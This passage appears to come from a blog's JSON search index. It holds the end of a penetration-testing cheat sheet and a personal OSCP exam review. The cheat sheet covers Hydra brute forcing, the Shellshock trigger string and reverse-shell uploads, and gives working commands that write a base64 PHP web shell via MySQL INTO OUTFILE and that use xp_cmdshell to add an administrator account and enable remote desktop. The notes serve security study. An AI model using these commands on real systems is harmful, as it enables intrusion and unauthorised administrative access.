It can take in files in /etc/passwd /etc/shadow format and identify which hash algorithm is in use. It is very powerful.Password GuessingOne of the quickest ways to compromise a system is to brute force a password. It is also important to try well known combinations, admin:admin, admin:password, and so on. It’s also very helpful to find out what the default username and password is for an application to see if it has been changed or removed.Brute force tools like Hydra are great for iterating through user and password lists against HTML, SSH, FTP, authentication to start. The command line can be tricky, especially with web authentication, but it is good to know how to use it.Custom Password ListsUse Cewl and John the Ripper to create custom password lists from web sites and other input.Remote Code ExecutionRemote code execution or RCE is when an attacker is able to run code on a remote system. It can be done through buffer overflow exploits, misconfigured web servers, badly coded applications, and is a very strong method of compromise when it exists.Shellshock or BashbugShellshock takes advantage of an environment variable being passed from an application to the bash shell. Using a specific string to start the variable, () { :; }; , it stops being interpreted as a string and instead as a bash command. This allows the attacker to string along shell commands to be executed by the program.https://blog.cloudflare.com/inside-shellshock/Anonymous FTPAnonymous FTP can lead to different attack avenues. If the system has an additional vulnerability in FTP that requires being authenticated, such as a directory traversal attack, then it makes it that much simpler. If the FTP server is configured to allow access to certain directories, for instance the web root, you can upload bind and reverse shells to the web server then execute them through the browser.SMB SharesSMB Shares that are public can be great avenues for attack. If the share is the web root or part of it, you can upload bind and reverse shells to the system to call from your browser. Tools like enum4linux can identify these shares and smbclient can be used to connect to it directly.Privilege EscalationOperating systems have many different vectors for privilege escalation. Some are simple, some are complex, it is worth taking the time to understand how each works so you know what to look for.Windows Escalation Windows Privilege Escalation Fundamentals Windows Exploit Suggester Dumping Windows CredentialsLinux Escalation Basic Linux Privilege Escalation Rebootuser Linux Enumeration &amp;amp; Priv Esc Linux Priv Checker LinEnumDatabase AttacksIf you are able to gain access to a database, there are several ways you can use it to your advantage:MySQL ExampleIf you can connect to a remote MySQL server and get command line access via:root@kali:~# mysql -u root -p -h 192.168.1.100You may be able to output a file to disk via the MySQL command line (you can put the base64 payload (from msfvenom, for example) into a select):mysql&amp;gt; select &quot;&amp;lt;?PHP eval(base64_decode(&amp;lt;base64-value-here&amp;gt;)); ?&amp;gt;&quot; INTO OUTFILE &quot;../../www/html/shell.php&quot;;Query OK, 1 row affected (0.00 sec)Microsoft SQL Server ExampleIn the event of Microsoft SQL Server you may want to check whether you can use xp_cmdshell to execute commands. The following is just one example of how you may be able to create a user and enable remote desktop on a victim machine.Connect to server via sqsh (need to setup configuration in ~/.sqshrc first)root@kali:~# sqsh -S 192.168.1.100Attempt to enable itexec sp_configure &#39;show advanced options&#39;, 1goreconfiguregoexec sp_configure &#39;xp_cmdshell&#39;, 1goreconfiguregoTry to add userxp_cmdshell &#39;net user testuser password /add&#39;goxp_cmdshell &#39;net localgroup Administrators testuser /add&#39;goTry to enable remote desktopxp_cmdshell &#39;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#39;go" }, { "title": "OSCP Review", "url": "/posts/oscp-review/", "categories": "Blogging, Offensive-Security", "tags": "offensive-security, oscp, penetration-testing, hacking", "date": "2017-07-14 12:00:00 -0700", "snippet": "BackgroundI have been a developer for longer than I can remember (over 20 years), interested in hacking and the security side of things for much of it as well. However, it wasn’t until relatively recently (3 or so years) that I started to consider an actual pivot away from every day development into more of a security focused type of role. It didn’t take too long to realize that the Offensive Security training was what I was looking for.Coming into this as someone that was primarily a developer was probably harder than someone coming in as a network administrator. I found very quickly that my understanding of networking and protocols was not up-to-speed and that I had quite a bit of learning to do. I had only mildly played with Kali Linux as well but had been using Linux regularly for 5 or so years (and now as a daily driver).At work, I kept driving towards doing more security related development work and with some persistence and good timing a security focused development team was developed that I now work in. One of my colleagues and I decided it was time to sign up for the OSCP and go through this experience.The OSCP LabI signed up for the OSCP training with two months of lab time. I read through the syllabus over and over and started reading about many of the tools before I ended up starting the lab. Once I signed up I pretty much watched all of the videos straight through in a single sitting. Throughout the following month I went back several times to watch some of the video sections over. The majority of the time was spent in the lab attempting to find vulnerabilities in the systems on the public network.Things are structured where once you VPN in you have access to the public network with quite a few machines in it. Upon compromising certain machines you will find some that are connected to other networks in which you can pivot to.It took quite a bit of time learning how to effectively do enumeration and I didn’t realize quite how important it was to get this right until later. Developing a good systematic method to enumerate and log findings is a key skill to develop. Learning how to gather all information first before diving deep into any one of them is critical. Initially, I would find the first thing that looked promising and focus in on it hard ignoring everything else around it not realizing that there may have been some other low-hanging fruit right next to it.About a month and a half through the lab time I pretty much knew I was not there yet. I had compromised around 30 machines, one of which was among the harder machines called ‘pain’. I went all the way to the end of the two month thinking I would take the test right at the end. The lab time ended, I had a little break and ended up scheduling the exam around a month later.The OSCP ExamThe exam is a 24 hour performance based test where you VPN in and can either hack through the machines on the exam network or you can’t. Waiting to take the exam was a mistake and I think I had burnt myself out as I was basically doing nothing but 14 or so hours a day (more on weekends) for two months straight. I finally took the test and only compromised two machines fully with a low priv on a third and did not pass. It was upsetting but also not unexpected; I usually don’t fail at things I devote myself to so this was not normal.After a little break of a couple months I got more lab time, another two months. I started by going through and re-hacking the machines I previously did and the compromises did go much quicker this time around and in short time I had re-compromised over 20 of them and by around a month in was at around 45 machines compromised (including sufferance and humble (humble was figured out at the very end and taught a few lessons that I won’t soon forget)).Persevered until successI took my second attempt while I still had lab time left as I did not want to have a break like on the first exam. This time around I had a better understanding of the format of the test and what to expect. I did a little better on the exam but again got stuck on a particular machine where I knew it was either I escalated to pass or it was a fail; again, it got the better of me and I was In the 18+ hour point where it was hard to concentrate and I was unable to accomplish this task.On my third attempt I prepared based on some of my weak points and knew which machines to attack and in which order. Within the first two hours and had two machines down, in another 5 hours had escalated a third and a little later had a low privilege shell on a fourth. Things were going well and this all was happening before my mind turned to mush and I couldn’t think straight. I succeeded on this attempt and was able to get enough points to finally pass the exam.This whole process from signing up to being successful took me about 6 months due to a two month break in between my two lab sessions. I put more hours into studying this content than anything else I’ve ever done; seriously, I probably had spent over 700+ hours learning and practicing in this 6 month period of time.DocumentationDuring this time I signed up for a personal Confluence account and have been building out my own notes on every tool and process I learned up to this point.As I struggled through using different tools and learned the correct syntax and quirks of a tool I would document it. I now have quite a large penetration testing confluence site that has a wealth of information in it for me to reference and continue adding to. This was a smart move and I pretty much always have it up for reference and am updating it as I continue to learn more things.Whenever you make a breakthrough or get through a struggle you should document how you did it; you will end up running into it again and it is extremely helpful to return to accurate notes of how you did it the last time.Easiest PartEnjoying the subject matter made a certain amount of things easier for sure. Certainly it helped me get through a lot of the struggles and not give up. Working in Linux was much easier for me than perhaps others and I use Arch Linux as my daily driver. Even being an everyday Linux user I came out the other end even more familiar than I was before.The other part that was much easier for me was exploit development. I used to program in assembly and C/C++ and so this was a strong point for me. Compiling C code and writing and running Python exploits was generally very quick and any issues that came up were often very easy for me to resolve.Hardest PartThe Windows side of things was generally a little harder for me than Linux. Probably not for the reason you would think though. I have quite a bit of familiarity with both operating systems but Windows is just a pain to work with compared to Linux. Trying to do anything on a Windows box is like pulling teeth and it is frustrating.Through the process I have started picking up some better enumeration scripts and have created some of my own to assist in this. Usually the issues are pretty easy to locate but often the preparation and execution of the exploit takes longer than on a Linux based machine. One of the things that may be very helpful is to list out all known exploits for CVE’s against Windows and have pre-compiled exploits for them ready to go. I had so many instances where I needed to compile a Windows exploit and it was very time consuming. In some cases, you need to compile a python script as a Windows binary as well so having all these environments ready is important when the clock is ticking.Spinning up on the network security side of things was harder than the development side. I have now become much more proficient in networking related topics through the hands on knowledge I have gained during my lab time.Stress management was something I also struggled with from time to time. I had high expectations of myself and not performing to the level I thought I initially would affected me. It took me awhile to realize that this is normal and it actually meant that I am pushing myself to my limits which was a good thing.Final ThoughtsThis was the hardest exam I have ever taken in my life. It was often an emotional roller coaster for a variety of reasons over the course of the time doing it. This benefits of this course are in what you learn along the way with passing the exam being the bonus it all culminates with. Even if I didn’t end up getting the certification I still would be in a far better position knowledge-wise than before.I have acquired a lot of certifications through my years but none of them really tested whether you could actually “DO” and “APPLY” knowledge like the OSCP exam; going down this route was one of the best choices I have made in my professional career and is setting a path for where I want to go next.My plan going forward is to start uploading some of my projects and scripts to my github account, starting blogging now and then, tweet and little, and finally prepare for the OSCE. In preparation, I have gathered some information from peers that going through the SLAE course is a good idea so I will do that first and then start tackling the OSCE at the end of the year and make it my 2018 goal." } ]
